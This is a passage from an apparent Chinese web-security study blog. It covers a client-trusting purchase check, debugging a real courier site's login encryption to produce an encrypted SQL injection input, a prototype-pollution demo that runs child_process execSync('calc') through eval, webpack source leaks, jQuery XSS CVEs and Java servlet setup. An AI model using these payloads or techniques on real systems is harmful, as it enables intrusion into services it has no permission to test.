function_">val</span>(),</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-comment">// 请求成功时执行的函数</span></span><br><span class="language-javascript">            <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">res</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-comment">// 在控制台输出返回的数据</span></span><br><span class="language-javascript">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);</span><br><span class="language-javascript">                <span class="hljs-comment">// 如果返回的信息代码为1，表示购买成功</span></span><br><span class="language-javascript">                <span class="hljs-keyword">if</span>(res[<span class="hljs-string">&#x27;infoCode&#x27;</span>] == <span class="hljs-number">1</span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-comment">// 弹出成功提示</span></span><br><span class="language-javascript">                    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;购买成功&#x27;</span>);</span><br><span class="language-javascript">                    <span class="hljs-comment">// 购买成功的流程（你可以在这里添加额外的处理）</span></span><br><span class="language-javascript">                &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-comment">// 如果信息代码不为1，表示购买失败</span></span><br><span class="language-javascript">                    <span class="hljs-comment">// 弹出失败提示</span></span><br><span class="language-javascript">                    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;购买失败&#x27;</span>);</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-comment">// 指定返回的数据类型为 JSON</span></span><br><span class="language-javascript">            <span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;json&#x27;</span>,</span><br><span class="language-javascript">        &#125;);**</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>后端</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 从 POST 请求中获取购买数量</span><br><span class="hljs-variable">$num</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><br><span class="hljs-comment">// 假设购物车中已有的金钱数为10000，商品价格为8888</span><br><span class="hljs-comment">// 真实情况下，应该在数据库中获取用户的金钱数等信息</span><br><br><span class="hljs-comment">// 初始化一个关联数组变量，通过使用 &#x27;msg&#x27; 作为键，将 &#x27;ok&#x27; 作为值存储在其中。</span><br><span class="hljs-variable">$success</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>);<br><br>**<span class="hljs-comment">// 检查购买是否合法（金钱是否足够支付）</span><br><span class="hljs-keyword">if</span> (<span class="hljs-number">10000</span> &gt;= (<span class="hljs-variable">$num</span> * <span class="hljs-number">8888</span>)) &#123;<br>    <span class="hljs-comment">// 如果购买合法，设置信息代码为1表示购买成功</span><br>    <span class="hljs-variable">$success</span>[<span class="hljs-string">&#x27;infoCode&#x27;</span>] = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果购买不合法，设置信息代码为0表示购买失败</span><br>    <span class="hljs-variable">$success</span>[<span class="hljs-string">&#x27;infoCode&#x27;</span>] = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 将结果以 JSON 格式输出</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$success</span>);**<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li>
</ul>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="JS应用-DOM树-加密编码库-断点调试-逆向分析-元素属性操作"><a href="#JS应用-DOM树-加密编码库-断点调试-逆向分析-元素属性操作" class="headerlink" title="JS应用&amp;DOM树&amp;加密编码库&amp;断点调试&amp;逆向分析&amp;元素属性操作"></a>JS应用&amp;DOM树&amp;加密编码库&amp;断点调试&amp;逆向分析&amp;元素属性操作</h3><ol>
<li><p>断点调试–申通快递会员登录中心</p>
<ol>
<li><p>打开页面，选择密码右击鼠标打开检查找到相关id值<code>numPassword</code>​ 并进行全局(Ctrl+Shift+f)搜索</p>
<p> <img src="/assets/image-20240707151552-mfbcpg1.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>找到密码的加密格式，但是没有明文展现出来</p>
<p> <img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-07%20151844-20240707151918-l6rc7u2.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-07-07 151844">​</p>
</li>
<li><p>采用之前的方式在控制台中输入相应的代码<code>encodeURI(encrypt.encrypt(numPassword))</code>​<strong>报错encrypt is not defined</strong>，有一些文件只在服务器本地执行，<strong>不会加载到浏览器中</strong></p>
<p> <img src="/assets/image-20240707152224-uxdp2xm.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>必须采用调试断点的方式来，通过服务器获取其执行文件，然后修改对应的返回密文即可</p>
<ul>
<li><p>对应地方打上断点，点击登录，进入<strong>断点调试</strong>，发现右侧出现输入的账号密码内容</p>
<p><img src="/assets/image-20240707160246-ulfvid7.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>点击<strong>最右侧按钮</strong>，进入调试，再次打开控制台，并输入<code>encodeURI(encrypt.encrypt(numPassword))</code>​发现<strong>成功回显加密后的密码</strong></p>
<p><img src="/assets/image-20240707160408-0wlxdg7.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>修改为sql注入语句也成功返回</p>
<p><img src="/assets/image-20240707160152-69xv63f.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ul>
</li>
</ol>
</li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="JS应用-NodeJS指南-原型链污染-Express框架-功能实现-审计"><a href="#JS应用-NodeJS指南-原型链污染-Express框架-功能实现-审计" class="headerlink" title="JS应用&amp;NodeJS指南&amp;原型链污染&amp;Express框架&amp;功能实现&amp;审计"></a>JS应用&amp;NodeJS指南&amp;原型链污染&amp;Express框架&amp;功能实现&amp;审计</h3><ol>
<li><p>原型链污染</p>
<p> 如果攻击者控制并修改了一个对象的原型，(<strong>proto</strong>)<br> 那么将可以影响所有和这个对象来自同一个类、父祖类的对象。</p>
<p> <img src="/assets/image-20240707161746-dbzejxo.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// foo是一个简单的JavaScript对象</span><br><span class="hljs-keyword">let</span> foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125; <span class="hljs-comment">//1=1 0 __proto__= x</span><br><span class="hljs-comment">// 原型链污染</span><br><span class="hljs-comment">// foo.bar 此时为1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<span class="hljs-comment">//输出为1</span><br><br><span class="hljs-comment">// 修改foo的原型（即Object）</span><br>foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-string">&#x27;2&#x27;</span><br><br><span class="hljs-comment">// // 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<span class="hljs-comment">//输出为1</span><br><br><span class="hljs-comment">// // 此时再用Object创建一个空的zoo对象</span><br><span class="hljs-keyword">let</span> zoo = &#123;&#125;<br><br><span class="hljs-comment">// 查看zoo.bar，此时bar为2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(zoo.<span class="hljs-property">bar</span>)<span class="hljs-comment">//输出为2</span><br></code></pre></td></tr></table></figure>

<p> 利用原型链污染，调用系统计算器</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 创建一个包含属性 bar 的对象 foo，并将 bar 设置为 1</span><br><span class="hljs-keyword">let</span> foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125;;<br><br><span class="hljs-comment">// 输出 foo 对象的 bar 属性，预期输出为 1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>); <span class="hljs-comment">// 输出: 1</span><br><br>**<span class="hljs-comment">// 修改 foo 对象的原型链上的 bar 属性，将其设置为执行命令 &#x27;require(\&#x27;child_process\&#x27;).execSync(\&#x27;calc\&#x27;);&#x27;</span><br><span class="hljs-comment">//调用计算机</span><br>foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-string">&#x27;require(\&#x27;child_process\&#x27;).execSync(\&#x27;calc\&#x27;);&#x27;</span>;**<br><br><span class="hljs-comment">// 输出 foo 对象的 bar 属性，预期输出仍为 1，因为直接属性优先于原型链上的属性</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>); <span class="hljs-comment">// 输出: 1</span><br><br><span class="hljs-comment">// 创建一个空对象 zoo</span><br><span class="hljs-keyword">let</span> zoo = &#123;&#125;;<br><br>**<span class="hljs-comment">// 使用 eval 执行 zoo 对象的 bar 属性，由于 zoo 对象没有 bar 属性，会导致 ReferenceError</span><br><span class="hljs-comment">//调用计算机</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">eval</span>(zoo.<span class="hljs-property">bar</span>));**<br></code></pre></td></tr></table></figure>

<p> <img src="/assets/image-20240707161822-t68dzwk.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>ctfshow—web334</p>
<p> <img src="/assets/image-20240707161932-shvg6hw.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="JS应用-WebPack打包器-第三方库JQuery-安装使用-安全检测"><a href="#JS应用-WebPack打包器-第三方库JQuery-安装使用-安全检测" class="headerlink" title="JS应用&amp;WebPack打包器&amp;第三方库JQuery&amp;安装使用&amp;安全检测"></a>JS应用&amp;WebPack打包器&amp;第三方库JQuery&amp;安装使用&amp;安全检测</h3><ol>
<li><p>webpack使用</p>
<ul>
<li><p>创建WebPack，并创建目录src在目录下创建js目录在js目录下创建sum.js count.js</p>
<p><img src="/assets/image-20240709200608-rcuhzf1.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>sum.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">x,y</span>)&#123;<br>    <span class="hljs-keyword">return</span> x+y;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>count.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">count</span>(<span class="hljs-params">x,y</span>)&#123;<br>    <span class="hljs-keyword">return</span> x-y;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>在src目录下创建与js同级main.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> count <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./js/count&quot;</span>;<br><span class="hljs-keyword">import</span> sum <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./js/sum&quot;</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">sum</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>));<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">count</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>));<br></code></pre></td></tr></table></figure></li>
<li><p>再创建src同级文件index.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;main.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure></li>
<li><p>报错Cannot use import statement outside a module，尝试在不支持模块的环境中使用 ES6 的 import 打包语句造成无法执行；</p>
<p><img src="/assets/image-20240709200949-hel0m7m.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>安装webpack库<code>npm i webpack webpack-cli -g</code>​</p>
<p><img src="/assets/image-20240709201123-hti84t5.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>创建webpack配置文件—创建src同级文件webpack.config.js不能改名称</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 引入path模块，用于处理文件路径</span><br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-comment">// Webpack配置对象</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    **<span class="hljs-comment">// 指定入口文件，即Webpack从这个文件开始构建依赖图</span><br>    <span class="hljs-attr">entry</span>: <span class="hljs-string">&#x27;./src/main.js&#x27;</span>,**<br><br>    <span class="hljs-comment">// 指定输出配置</span><br>    <span class="hljs-attr">output</span>: &#123;<br>        <span class="hljs-comment">// 输出的文件路径，使用path.resolve确保路径的正确性</span><br>        <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;dist&#x27;</span>),<br><br>        <span class="hljs-comment">// 输出的文件名</span><br>        <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;bundle.js&#x27;</span>,<br><br>        <span class="hljs-comment">// 在每次构建前清理输出目录</span><br>        <span class="hljs-attr">clean</span>: <span class="hljs-literal">true</span>,<br>    &#125;,<br><br>    <span class="hljs-comment">// 指定打包模式，可以是 &#x27;development&#x27; 或 &#x27;production&#x27;</span><br>    <span class="hljs-attr">mode</span>: <span class="hljs-string">&quot;development&quot;</span>, <span class="hljs-comment">// 或者 &quot;production&quot;</span><br>    <span class="hljs-comment">//mode:&quot;production&quot;,</span><br>&#125;;<br></code></pre></td></tr></table></figure></li>
<li></li>
<li><p>entry: 指定入口文件，即Webpack从哪个文件开始构建依赖关系图。</p>
</li>
<li><p>output: 指定输出的目录和文件名，以及是否在每次构建前清理输出目录。</p>
</li>
<li><p>mode: 指定打包的模式，可以是 ‘development’ 或 ‘production’。</p>
</li>
<li><p>development 模式下会启用一些开发工具，容易造成源码泄露</p>
</li>
<li><p>production 模式下会进行代码优化，代码极简化。</p>
</li>
<li><p>运行webpack打包命令<code>npx webpack</code>​</p>
<p><img src="/assets/image-20240709201343-o76u8ev.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>打包成功后，在index.html中将引用的代码切换为打包好的<code>./dist/bundle.</code>​</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;body&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./dist/bundle.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>&lt;/body&gt;<br></code></pre></td></tr></table></figure></li>
<li><p>运行成功，并回显定义的两个函数计算结果</p>
<p><img src="/assets/image-20240709201442-7fqc20s.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ul>
</li>
<li><p>webpack安全</p>
<p> WebPack源码泄漏-模式选择</p>
<ul>
<li><p><strong>​<code>development</code>​</strong>​ 模式下会启用一些开发工具，<strong>容易造成源码泄露</strong></p>
<p><img src="/assets/image-20240709201635-3ricau0.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p><strong>​<code>production</code>​</strong>​ 模式下会进行代码优化，<strong>代码极简化</strong>。</p>
<p><img src="/assets/image-20240709201649-6kb6t6e.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ul>
<p> 模糊提取安全检查-PacketFuzzer</p>
<p> <a target="_blank" rel="noopener" href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p>
</li>
<li><p>第三方库-JQuery-使用&amp;安全</p>
<p> <img src="/assets/image-20240709202351-k8irbjz.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <strong>3.4.1版本就有被xss植入的风险而3.5.1版本没有</strong></p>
<p> <img src="/assets/image-20240709202415-dccq57b.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240709202429-g0pfyij.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 检测：<a target="_blank" rel="noopener" href="http://research.insecurelabs.org/jquery/test/">http://research.insecurelabs.org/jquery/test/</a><br> 测试：CVE-2020-11022&#x2F;CVE-2020-11023<br> 参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44309905/article/details/120902867">https://blog.csdn.net/weixin_44309905/article/details/120902867</a></p>
<p> <img src="/assets/image-20240709202514-ih0o747.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="JavaEE应用-Servlet路由技术-JDBC-Mybatis数据库-生命周期"><a href="#JavaEE应用-Servlet路由技术-JDBC-Mybatis数据库-生命周期" class="headerlink" title="JavaEE应用&amp;Servlet路由技术&amp;JDBC&amp;Mybatis数据库&amp;生命周期"></a>JavaEE应用&amp;Servlet路由技术&amp;JDBC&amp;Mybatis数据库&amp;生命周期</h3><ol>
<li><p>创建项目</p>
<p> <img src="/assets/image-20240714111750-fmtv76w.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>创建并使用Servlet</p>
<p> <img src="/assets/image-20240714111942-ahwosdt.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240714112315-5ufvbs1.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>配置Servlet路由的两种方式</p>
<ol>
<li><p>web.xml配置Servlet路由</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--定义Servlet--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>index<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 指定Servlet类的完整路径 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.demo2.IndexServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 配置Servlet映射 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>index<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 指定Servlet的URL映射 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/index<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p> <img src="/assets/image-20240714112834-9tsw4bw.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>WebServlet配置Servlet路由</p>
<p> <img src="/assets/image-20240714113051-kiy40oi.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ol>
</li>
<li><p>写入内置方法(init service destroy doGet doPost)—–此时用的是WebServlet配置Servlet路由</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo1;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletConfig;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.ServletResponse;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-comment">// 使用@WebServlet注解将Servlet映射到特定的URL</span><br><span class="hljs-meta">@WebServlet(&quot;/a&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-comment">// 处理GET请求的方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;--------------doGet&quot;</span>);<br><br>        <span class="hljs-comment">// 从请求中获取参数&quot;id&quot;</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;id&quot;</span>);<br><br>        <span class="hljs-comment">// 设置响应的内容类型</span><br>        resp.setContentType(<span class="hljs-string">&quot;text/html; 